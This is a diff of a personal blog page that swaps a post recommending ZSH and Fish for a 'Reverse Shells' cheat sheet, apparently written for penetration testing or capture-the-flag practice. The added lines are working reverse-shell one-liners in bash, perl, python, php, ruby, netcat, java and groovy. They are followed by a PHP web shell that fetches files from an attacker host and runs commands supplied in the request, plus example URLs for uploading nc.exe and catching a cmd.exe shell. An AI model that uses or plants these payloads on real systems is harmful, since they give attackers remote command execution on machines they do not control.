@@ -11,10 +11,10 @@
 
     <base href="https://d47zm3.me">
     <title>
-  Shells · d47zm3
+  Reverse Shells · d47zm3
 </title>
 
-    <link rel="canonical" href="https://d47zm3.me/resources/environment/shells/">
+    <link rel="canonical" href="https://d47zm3.me/resources/infosec/reverse-shells/">
 
     <link href="https://fonts.googleapis.com/css?family=Lato:400,700|Merriweather:300,700|Source+Code+Pro:400,700" rel="stylesheet">
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous" />
@@ -86,40 +86,57 @@
   <section class="container page">
   <article>
     <header>
-      <h1>Shells</h1>
+      <h1>Reverse Shells</h1>
     </header>
 
     
 
-<p>From my experience two shells that are worth notice are</p>
+<p>Reverse shells in various languages/platforms.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"># bash
+bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
 
-<ul>
-<li><a href="https://github.com/zsh-users/zsh">ZSH</a></li>
-<li><a href="https://fishshell.com/">Fish</a></li>
-</ul>
+# perl
+perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
 
-<p>In practice though, you can achieve Fish features installing particular plugins for ZSH, and yet, ZSH will still be more compatible with Bash, while Fish introduces it&rsquo;s own syntax and quirks, which may be hard to adapt after long years with Bash/ZSH. Yet, still I find it very nice as out-of-box solution. Two very well known plugin packages for ZSH are</p>
+# python
+python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;
 
-<ul>
-<li><a href="https://github.com/robbyrussell/oh-my-zsh.git">Oh-My-ZSH</a></li>
-<li><a href="https://github.com/sorin-ionescu/prezto.git">Prezto</a></li>
-</ul>
+# php
+php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,1234);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
 
-<p>Second one seems a little more light-weight though, but both are very nice. Fish has also it&rsquo;s own framework:</p>
+# ruby
+ruby -rsocket -e&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,1234).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;
 
-<ul>
-<li><a href="https://github.com/oh-my-fish/oh-my-fish.git">Oh-My-Fish</a></li>
-</ul>
+# netcat
+nc -e /bin/sh 10.0.0.1 1234
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
 
-<p>I recommend to test various configrations and frameworks, and find one best that suits you!</p>
 
-<h3 id="useful-addons">Useful Addons</h3>
+# java
+r = Runtime.getRuntime()
+p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[])
+p.waitFor()
 
-<ul>
-<li><p><a href="https://github.com/junegunn/fzf">Command Line Fuzzy Finder</a></p></li>
+# groovy
+String host=&#34;localhost&#34;;
+int port=8044;
+String cmd=&#34;cmd.exe&#34;;
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</pre></div>
+<h3 id="reliable-simple-php-shell-to-upload-execute-code">Reliable, simple PHP shell to upload/execute code</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if (isset($_REQUEST[&#39;fupload&#39;])) {
+  file_put_contents($_REQUEST[&#39;fupload&#39;], file_get_contents(&#34;http://10.10.16.10:8000/&#34; . $_REQUEST[&#39;fupload&#39;]));
+};
 
-<li><p><a href="https://github.com/sharkdp/bat">bat - A cat(1) clone with wings.</a></p></li>
-</ul>
+if (isset($_REQUEST[&#39;fexec&#39;])) {
+  echo &#34;&lt;<span style="color:#f92672">pre</span>&gt;&#34; . shell_exec($_REQUEST[&#39;fexec&#39;]) . &#34;&lt;/<span style="color:#f92672">pre</span>&gt;&#34;;
+};</code></pre></div>
+<p>Serve up nc.exe from your machine and download it</p>
+
+<p><code>http://10.10.10.9/catch.php?fupload=nc.exe</code></p>
+
+<p>Execute and catch shell</p>
+
+<p><code>http://10.10.10.9/catch.php?fexec=nc.exe 10.10.16.10 1234 -e cmd.exe</code></p>
 
   </article>
 </section>
